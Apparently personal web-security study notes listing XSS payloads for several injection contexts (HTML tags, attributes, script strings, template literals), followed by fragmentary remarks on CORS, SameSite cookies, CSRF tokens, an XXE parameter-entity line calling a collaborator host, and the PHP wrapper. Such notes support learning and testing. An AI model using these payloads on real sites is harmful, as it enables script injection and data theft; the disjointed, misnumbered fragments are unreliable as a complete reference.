                                                     DOM - it's a web browesrs hireracheal represtation of the elements on a page, developers use javascript to manipulate nodes & elements of the dom. When a website containing javascript takes the user controllable value know as source and pass it to dangerous function known as sink, 

                                                     A source is a javascript property that accepts attacker controlled data like location.search, document.cookie & document.referrer      
                                                     
                                                     eval() function is a sink because it process the data passed to it as javascript document.body.innerHTML because it potentially allows attacker to inject HTMl and execute arbitary javascript

                                                    1. XSS between HTML tags - 

                                                             When the XSS context is text between HTML tags, you need to introduce some new HTML tags designed to trigger execution of JavaScript. 

                                                                    <h1>haikupayload</h1>
                                                                         <script>alert(document.domain)</script>
                                                                         <img src=1 onerror=alert(1)>




                                                    2. XSS in HTML tag attributes -

                                                         When the XSS context is into an HTML tag attribute value, you might sometimes be able to terminate the attribute value, close the tag, and introduce a new one.

                                                                 <h1> <input type=text placeholder='Search the blog...' name=search value="haikupayload"> </h1>
                                                                     " autofocus onfocus=alert(document.domain) x="


                                                         Sometimes the XSS context is into a type of HTML tag attribute that itself can create a scriptable context. Here, you can execute JavaScript without needing to terminate the attribute value. For example, if the XSS context is into the href attribute of an anchor tag, you can use the javascript pseudo-protocol to execute script. For example: 

                                                                        javascript:alert(1)

                                                        hidden & canonical which dont fire automatically

                                                                     <link rel="canonical" accesskey="X" onclick="alert(1)" />





                                                    3. XSS into JavaScript -


                                                        i. Terminating the existing script

                                                                     <script> var=haiku </script> 
                                                                            payload :- </script><img src=1 onerror=alert(document.domain)>


                                                        ii. Breaking out of script

                                                                 In cases where the XSS context is inside a quoted string literal, it is often possible to break out of the string and execute JavaScript directly. It is essential to repair the script following the XSS context, because any syntax errors there will prevent the whole script from executing.


                                                                        '-alert(document.domain)-'
                                                                        ';alert(document.domain)//


                                                        iii. Escaping sting terminator

                                                                escaping any single quote characters with a backslash


                                                                     For example, suppose that the input:
                                                                            ';alert(document.domain)//

                                                                            gets converted to:
                                                                            \';alert(document.domain)//

                                                                            You can now use the alternative payload:
                                                                            \';alert(document.domain)//

                                                                            which gets converted to:
                                                                            \\';alert(document.domain)//




                                                         iv.  HTML encoded & escaped


                                                                \'-alert(1)//
                                                                onerror=alert;throw 1



                                                         v.  Making use of HTML-encoding


                                                               When the XSS context is some existing JavaScript within a quoted tag attribute, such as an event handler, it is possible to make use of HTML-encoding to work around some input filters.


                                                                    <a href="#" onclick="... var input='controllable data here'; ...">

                                                                            &apos;-alert(document.domain)-&apos;

                                                                            http://foo?&apos;-alert(1)-&apos;



                                                         vi.  JavaScript template literals

                                                                    ${alert(document.domain)}
                                                                    ${alert(1)}

                            13. CORS


                                                                SOP 


                                                        It generally allows a domain to issue requests to other domains, but not to access the responses. 

                                                        And that is where XSS comes into play. It essentially allows bypassing of the SOP, because now an attacker can execute their script from the same origin as the application (eg facebook.com).


                                                        Access-Control-Allow-Credentials: true
                                                         Without that header, the victim user's browser will refuse to send their cookies, meaning the attacker will only gain access to unauthenticated content, which they could just as easily access by browsing directly to the target website.


                                                         not permitted

                                                            When we look at the details of SameSite cookies, we're going to be dealing a lot with the concept of "same-site" and "cross-site" requests. This is similar to another phrase you may have heard, "cross-origin" requests, but they are subtly different.

                                                          


                                                            In summary, two URLs are considered to be "same-site" if they:

                                                                Have the same scheme i.e. http or https
                                                                Have the same domain i.e. example.com, andrewlock.net or microsoft.com

                                                            some applications do not maintain any server-side record of tokens that have been issued, but instead duplicate each token within a cookie and a request parameter. When the subsequent request is validated, the application simply verifies that the token submitted in the request parameter matches the value submitted in the cookie. This is sometimes called the "double submit" defense against CSRF, and is advocated because it is simple to implement and avoids the need for any server-side state:

                                                               it is difficult to exfiltrate plain text files that are not valid XML files (e.g. files that contain XML special characters such as &, < and >)

                                                            Sometimes, XXE attacks using regular entities are blocked, due to some input validation by the application or some hardening of the XML parser that is being used. In this situation, you might be able to use XML parameter entities instead. XML parameter entities are a special kind of XML entity which can only be referenced elsewhere within the DTD.


                                                            <!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> %xxe; ]>

                                                            PHP Wrapper

                                                            The PHP language allows stealing of file content regardless whether they contains illegal characters. This is unique to PHP alone.

                                                            PHP has a pseudo url "php://" that when invoked by PHP programs, can be abused to do base64 encoding of a resource before sending to output stream.
